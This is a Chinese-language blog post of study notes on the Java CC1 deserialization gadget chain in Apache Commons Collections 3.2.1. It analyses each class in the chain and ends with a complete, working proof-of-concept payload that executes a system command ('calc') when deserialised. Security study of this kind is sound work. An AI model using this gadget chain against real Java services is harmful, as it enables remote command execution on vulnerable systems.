---
title: Java 反序列化学习笔记：CC1 链
date: 2026-04-02 09:30:00
categories:
  - Java安全
tags:
  - Java反序列化
  - CC1
  - CommonsCollections
  - 利用链

---

## CC1链：
### 一、漏洞背景与环境准备
#### 1.组件简介：
Apache Commons Collections 3.2.1 漏洞成因。

#### 2.实验坏境：
JDK 版本要求（8u65 及以下）

[https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html](https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html)

依赖库配置

[http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/rev/af660750b2f4](http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/rev/af660750b2f4)

### 二、核心链分析
#### 1.InvokerTransformer类
这是一个经验论，因为InvokerTransformer.transform中的 Method.invoke()可以调用执行任意的方法和命令

![](/img/posts/java-deserialization-notes/java-deserialization-notes-01.png)

然后要去逆这个transform()方法，看哪里有调用它。虽然能找到很多地方是以xxx.transform()的形式，但要找个最好用的，定位到TransformedMap

#### 2.TransformMap类
![](/img/posts/java-deserialization-notes/java-deserialization-notes-02.png)

里面的这个checkSetValue对像，方法一被调用就可立即执行transform，但是checkSetValue被定义为protected，需要找同包中调用它的。还有一点，这里的valueTransformer是个参数可以被赋值，找到赋值的地方

![](/img/posts/java-deserialization-notes/java-deserialization-notes-03.png)

同样是被定义为protected，要想赋值也得找实例化

那么就先从TransformMap开始找

![](/img/posts/java-deserialization-notes/java-deserialization-notes-04.png)

![](/img/posts/java-deserialization-notes/java-deserialization-notes-05.png)

可以找到两个，但decorate更方便，static(静态)关键词，允许直接使用。

接着我要去寻找checkSetValue

#### 3.AbstractInputCheckedMapDecorator类
![](/img/posts/java-deserialization-notes/java-deserialization-notes-06.png)

![](/img/posts/java-deserialization-notes/java-deserialization-notes-07.png)

很复杂啊，来分析一下。parent参数定位到上面MapEntry中可以传参，因为要用的是TransformMap中的checkSetValue，所有parent传参就是TranformMap，但是MapEntry也是protected，同样要找个包。

要想执行方法还要调用setValue对象，逆一下。

#### 4.AnnotationInvocationHandler类
![](/img/posts/java-deserialization-notes/java-deserialization-notes-08.png)

找到了意外之喜，readObject()一切的开始

![](/img/posts/java-deserialization-notes/java-deserialization-notes-09.png)

这样就链起来了memberValue.setValue()会触发parent.checkSetValue()，内部方法直接调用valueTransformer.transform()。其中parent和valueTransformer参数可控，InvokerTransformer开始工作反射执行命令。

#### 5.参数确认
现在来看一下，parent从哪里传入

![](/img/posts/java-deserialization-notes/java-deserialization-notes-10.png)

就是从MapEntry传入，但是MapEntry也是protected，还是得逆着找到EntrySet(protected)，接着找到entrySet

![](/img/posts/java-deserialization-notes/java-deserialization-notes-11.png)

![](/img/posts/java-deserialization-notes/java-deserialization-notes-12.png)

这个AbstractInputCheckedMapDecorator是abstract修饰，不能直接实例化，但能被子类继承它的方法，而子类中就有TransformMap，而entrySet中parent传的是this，也就是谁调用的就传谁，很明显是TransformMap，刚好符合我们的需求。

![](/img/posts/java-deserialization-notes/java-deserialization-notes-13.png)

### 三、构造攻击payload
Runtime是不被允许序列化的，因为没有Serializable接口，意味着我们的代码不被允许执行，所以有一个神奇的ConstantTransformer类，它确保了无论接收到什么输入，都返回Runtime.class

正常反射代码如下

```java
  public static void main(String[] args) throws Exception{
        InvokerTransformer invokerTransformer = new InvokerTransformer(
                "exec",
                new Class[]{String.class},
                new Object[]{"calc"}
        );
        Runtime runtime = Runtime.getRuntime();
        invokerTransformer.transform(runtime);
    }
```

序列化反射代码如下

```java
 public static void main(String[] args) throws Exception {
        Transformer[] TransformerArray = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(TransformerArray);
```

将其转义

第1步：确认要用Runtime.class

第2步：确定要用的方法是getRuntime()

第3步：如果说1，2两步只是确认要调用的内容，那这一步就是将其编写成可执行代码

第4步：真正要执行的内容

ChainedTransformer的作用就是将四个动作串在一起当成一个动作。

来入口处捋一下执行条件

<!-- 这是一张图片，ocr 内容为：(MAP.ENTRY<STRING, OBJECT> MEMBERVALUE : MEMBERVALUES.ENTRYSET() { FOR STRING MEMBERVALUE.GETKEY(); NAME CLASS<?> MEMBERTYPE - MEMBERTYPES.GET(NAME); IF (MEMBERTYPE !- NULL) { // I.E. MEMBER STILL EXISTS OBJECT VALUE - MEMBERVALUE.GETVALUE(); IF (!(MEMBERTYPE.ISINSTANCE(VALUE) LL VALUE INSTANCEOF EXCEPTIONPROXY)) { MEMBERVALUE.SETVALUE( NEW ANNOTATIONTYPEMISMATCHEXCEPTIONPROXY( + "]").SETMEMBER( FOUNDTYPE: VALUE.GETCLASS() + "[" - VALUE ANNOTATIONTYPE.MEMBERS().GET(NAME))); -->
![](/img/posts/java-deserialization-notes/java-deserialization-notes-14.png)

这个循环要进行，需要创建一个Map容器（Map容器通过唯一的key寻找value），一个是key的类型得合法，另一个是value不是正常类型，也不是ExceptionProxy就进入下面逻辑，在payload里加入

```java
HashMap map = new HashMap<>();
map.put("value", "i am R1d3r");
```

这里很特殊，两个都不能直接实例化，所以TransformedMap用了工厂方法模式，AnnotationInvocationHandler用了反射的方式

```java
Map<Object, Object> transformedMap = TransformedMap.decorate(map, null, chainedTransformer);

Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
Constructor constructor = clazz.getDeclaredConstructor(Class.class, Map.class);
constructor.setAccessible(true);
Object obj = constructor.newInstance(Target.class, transformedMap);
```

Class.forname() -- 根据类名字符串加载类

getDeclaredConstructor() -- 获取构造函数，找到对应的对象的方法

<!-- 这是一张图片，ocr 内容为：ANNOTATIONINVOCATIONHANDLER(CLASSS? EXTENDS ANNOTATION> TYPE, HAP<STRING, OBJECT> MEMBERVALUES, -->
![](/img/posts/java-deserialization-notes/java-deserialization-notes-15.png)

constructor.setAccessible(true) -- 关闭访问权限，使它都能调用

newInstance() -- 相当于实例化 AnnotationInvocationHandler

最后我需要的是序列化数据流，将内容都序列化，传入后被反序列化执行

```java
package org.example;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.io.*;
import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.util.HashMap;
import java.util.Map;

public class cc1test {
    public static void main(String[] args) throws Exception {
        Transformer[] TransformerArray = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(TransformerArray);

        HashMap map = new HashMap<>();
        map.put("value", "i am R1d3r");

        Map<Object, Object> transformedMap = TransformedMap.decorate(map, null, chainedTransformer);

        Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor constructor = clazz.getDeclaredConstructor(Class.class, Map.class);
        constructor.setAccessible(true);
        Object obj = constructor.newInstance(Target.class, transformedMap);

        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("cc1.ser"));
        oos.writeObject(obj);
        oos.close();
        System.out.println("序列化完成");

        ObjectInputStream ois = new ObjectInputStream(new FileInputStream("cc1.ser"));
        ois.readObject();
        ois.close();
        System.out.println("反序列化完成");
    }

}

```
